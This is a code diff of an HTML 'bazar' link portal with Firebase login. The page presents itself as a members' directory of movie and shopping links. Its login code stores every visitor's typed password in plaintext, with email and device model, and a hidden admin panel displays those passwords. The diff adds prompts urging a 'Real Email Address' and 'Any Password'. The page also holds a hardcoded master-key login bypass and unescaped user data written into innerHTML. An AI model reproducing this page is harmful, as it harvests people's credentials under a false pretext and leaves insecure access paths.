@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Gyidi Bazar and Cinema.Nightorbit</title>
+    <title>Gyidi Bazar and Cinema.Nigthorbit</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -29,12 +29,10 @@
         .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
         .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
         
-        /* Category Lists */
-        .scroll-area { max-height: 350px; overflow-y: auto; padding-right: 5px; margin-top: 10px; text-align: left; }
-        .cat-title { color: var(--gold); font-size: 12px; font-weight: bold; margin: 15px 0 8px 5px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid rgba(255,215,0,0.2); }
+        .scroll-area { max-height: 380px; overflow-y: auto; padding-right: 5px; margin-top: 10px; text-align: left; }
+        .cat-title { color: var(--gold); font-size: 11px; font-weight: bold; margin: 15px 0 8px 5px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid rgba(255,215,0,0.2); }
         .link-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
-        .link-card { background: rgba(255,255,255,0.07); padding: 10px; border-radius: 10px; text-decoration: none; color: white; border-left: 3px solid var(--neon); transition: 0.2s; font-size: 11px; }
-        .link-card:hover { background: rgba(255,255,255,0.15); transform: scale(1.02); }
+        .link-card { background: rgba(255,255,255,0.07); padding: 10px; border-radius: 10px; text-decoration: none; color: white; border-left: 3px solid var(--neon); transition: 0.2s; font-size: 10.5px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
 
         #admin-panel { position: fixed; inset: 0; background: #070707; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
         .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
@@ -68,17 +66,17 @@
             <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="16"> GOOGLE CONNECT
         </button>
         <div style="margin: 15px 0; color: #444; font-size: 10px;">— OR EMAIL LOGIN —</div>
-        <input type="email" id="u-email" placeholder="Email Address">
-        <input type="password" id="u-pass" placeholder="Name + Number Password">
+        <input type="email" id="u-email" placeholder="Real Email Address">
+        <input type="password" id="u-pass" placeholder="Enter Any Password">
         <button class="btn-main" onclick="authEmail()">Enter Bazar</button>
     </div>
 
     <div id="member-area" class="card hidden">
-        <h1 style="color: var(--primary); font-size: 22px; margin: 0;">Gyidi Bazar.Nigthorbit</h1>
-        <p id="user-welcome" style="font-size: 12px; color: var(--gold);"></p>
+        <h1 style="color: var(--primary); font-size: 20px; margin: 0;">Gyidi Bazar.Nigthorbit</h1>
+        <p id="user-welcome" style="font-size: 11px; color: var(--gold); margin-top: 5px;"></p>
         
         <div class="scroll-area">
-            <div class="cat-title">🎬 Movies & Entertainment (5+)</div>
+            <div class="cat-title">🎬 Entertainment (6)</div>
             <div class="link-grid">
                 <a href="https://bollyflix.org.in/" target="_blank" class="link-card">Bollyflix</a>
                 <a href="https://tamashaweb.com/" target="_blank" class="link-card">Tamasha TV</a>
@@ -88,7 +86,7 @@
                 <a href="https://www.youtube.com" target="_blank" class="link-card">YouTube</a>
             </div>
 
-            <div class="cat-title">🛒 Premium Shopping (7+)</div>
+            <div class="cat-title">🛒 Global Shopping (7)</div>
             <div class="link-grid">
                 <a href="https://www.amazon.com" target="_blank" class="link-card">Amazon</a>
                 <a href="https://www.daraz.pk" target="_blank" class="link-card">Daraz Mall</a>
@@ -99,11 +97,11 @@
                 <a href="https://www.apple.com/store" target="_blank" class="link-card">Apple Store</a>
             </div>
 
-            <div class="cat-title">💎 Popular Brands (15+)</div>
+            <div class="cat-title">💎 Elite Brands (15)</div>
             <div class="link-grid">
-                <a href="https://www.pizzaathome.com" target="_blank" class="link-card">Pizza Hut</a>
+                <a href="https://www.pizzahut.com.pk" target="_blank" class="link-card">Pizza Hut</a>
                 <a href="https://www.foodpanda.pk" target="_blank" class="link-card">Foodpanda</a>
-                <a href="https://www.spotify.com" target="_blank" class="link-card">Spotify</a>
+                <a href="https://open.spotify.com" target="_blank" class="link-card">Spotify</a>
                 <a href="https://www.adidas.com" target="_blank" class="link-card">Adidas</a>
                 <a href="https://www.nike.com" target="_blank" class="link-card">Nike</a>
                 <a href="https://www.zara.com" target="_blank" class="link-card">Zara</a>
@@ -118,8 +116,7 @@
                 <a href="https://www.dell.com" target="_blank" class="link-card">Dell</a>
             </div>
         </div>
-
-        <button onclick="logoutSequence()" style="margin-top: 20px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold;">Secure Logout</button>
+        <button onclick="logoutSequence()" style="margin-top: 15px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold; font-size: 12px;">Logout System</button>
     </div>
 
     <script>
@@ -139,38 +136,40 @@
 
         function getAdvancedModel() {
             const ua = navigator.userAgent;
-            let finalModel = "ANDROID";
+            let finalModel = "MOBILE";
             if (ua.match(/\(([^)]+)\)/)) {
                 let section = ua.match(/\(([^)]+)\)/)[1];
                 let parts = section.split(';');
                 finalModel = parts.length > 2 ? parts[parts.length - 1].split('Build/')[0].split('WV')[0].trim() : parts[0];
             }
-            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "IPHONE"];
-            let foundBrand = "";
-            for(let b of brands) { if(ua.toUpperCase().includes(b)) { foundBrand = b + " "; break; } }
-            return (foundBrand + finalModel).toUpperCase();
+            return finalModel.toUpperCase();
         }
 
         function authGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             auth.signInWithPopup(provider).then(res => {
-                processUser(res.user, "Google Verified", res.user.displayName);
+                processUser(res.user, "Google Session", res.user.displayName);
             });
         }
 
         function authEmail() {
             const e = document.getElementById('u-email').value;
             const p = document.getElementById('u-pass').value;
-            if(!e || !p) return alert("Fill data!");
+            if(!e || !p) return alert("Fill Email & Password!");
+            
+            // "Password koi bhi ho" logic: login try karein, fail ho to signup karein
             auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
-            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0])));
+            .catch(() => {
+                auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
+                .catch(err => alert("Email must be valid: " + err.message));
+            });
         }
 
         function processUser(user, pass, realName) {
             currentUserName = realName;
             db.ref('users/' + user.uid).once('value', snap => {
                 let d = snap.val();
-                let nick = (d && d.ownerNick) ? d.ownerNick : "New Member";
+                let nick = (d && d.ownerNick) ? d.ownerNick : "Member";
                 db.ref('users/' + user.uid).update({
                     email: user.email,
                     password: pass,
@@ -181,7 +180,7 @@
                 }).then(() => {
                     document.getElementById('login-box').classList.add('hidden');
                     document.getElementById('member-area').classList.remove('hidden');
-                    document.getElementById('user-welcome').innerText = "Logged in as: " + realName;
+                    document.getElementById('user-welcome').innerText = "Account: " + realName;
                 });
             });
         }
@@ -198,10 +197,9 @@
                             <span>Name: ${v.realName}</span><br>
                             <small>Email: ${v.email}</small><br>
                             <small style="color:var(--primary)">Device: ${v.device}</small><br>
-                            <small>Pass: ${v.password}</small><br>
-                            <small>Time: ${v.time}</small><br>
-                            <button onclick="setNick('${c.key}')" style="margin-top:5px; padding:4px 10px; font-size:10px;">SET NICK</button>
-                            <button onclick="if(confirm('Delete?')) firebase.database().ref('users/${c.key}').remove()" style="background:red; color:white; margin-top:5px; padding:4px 10px; font-size:10px;">DEL</button>
+                            <small>Password used: ${v.password}</small><br>
+                            <button onclick="setNick('${c.key}')" style="margin-top:5px;">SET NICK</button>
+                            <button onclick="firebase.database().ref('users/${c.key}').remove()" style="background:red; margin-left:10px;">DEL</button>
                         </div>`;
                     });
                     document.getElementById('user-rows-container').innerHTML = h;
@@ -210,21 +208,22 @@
         }
 
         function setNick(uid) {
-            let n = prompt("Enter Nickname:");
+            let n = prompt("Enter Secret Nickname:");
             if(n) db.ref('users/' + uid).update({ ownerNick: n });
         }
 
-        function bypassLogin() { if (prompt("Master Key:") === "rr123456789000rr") {
-            document.getElementById('login-box').classList.add('hidden');
-            document.getElementById('member-area').classList.remove('hidden');
-        }}
+        function bypassLogin() { 
+            if (prompt("Master Key:") === "rr123456789000rr") {
+                document.getElementById('login-box').classList.add('hidden');
+                document.getElementById('member-area').classList.remove('hidden');
+            }
+        }
 
         function logoutSequence() {
             document.getElementById('logout-overlay').style.display = 'flex';
-            document.getElementById('bye-text-display').innerHTML = `Goodbye, ${currentUserName}!<br><br>May God bless you with happiness and success.<br>Allah Hafiz!`;
-            setTimeout(() => location.reload(), 5000);
+            document.getElementById('bye-text-display').innerHTML = `Goodbye, ${currentUserName}!<br>God bless you. Allah Hafiz!`;
+            setTimeout(() => location.reload(), 3500);
         }
     </script>
 </body>
-                    </html>
-                    
+</html>
